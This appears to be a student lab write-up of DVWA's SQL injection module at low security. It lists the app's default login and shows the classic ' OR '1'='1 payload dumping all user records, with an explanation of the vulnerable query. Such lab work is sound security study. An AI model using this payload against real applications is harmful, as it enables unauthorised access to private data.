# DVWA – Task 3: SQL Injection (Low Security)

This task demonstrates how SQL Injection vulnerabilities occur when user input is not sanitized before being passed into a database query. Using DVWA’s SQL Injection module (Security Level: Low), I performed a series of tests to identify and exploit the vulnerability, extract user data, and document the findings.

---

## 🔧 Environment Setup

- **Platform:** DVWA running on Ubuntu (Apache2 + MySQL)
- **DVWA Security Level:** Low
- **Database:** Successfully created using DVWA setup page
- **Login Credentials:**
  - Username: `admin`
  - Password: `password`

---

## 🧪 1. Normal Application Behavior

To understand the baseline functionality, I entered a valid user ID:
```
1
```

DVWA returned the expected result:

- First name: admin  
- Surname: admin  

This confirms the backend query is functioning normally.

---

## 🔥 2. SQL Injection Exploit

To test for SQL Injection, I submitted the following payload:
```
' OR '1'='1
```


### ✔ Result:
DVWA returned **all user records**, proving the input field is vulnerable.

### Why it works:

The backend query looks like:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id';
By injecting ' OR '1'='1, the WHERE clause becomes:
WHERE user_id = '' OR '1'='1'
Since '1'='1' is always true, the database returns every row.
```
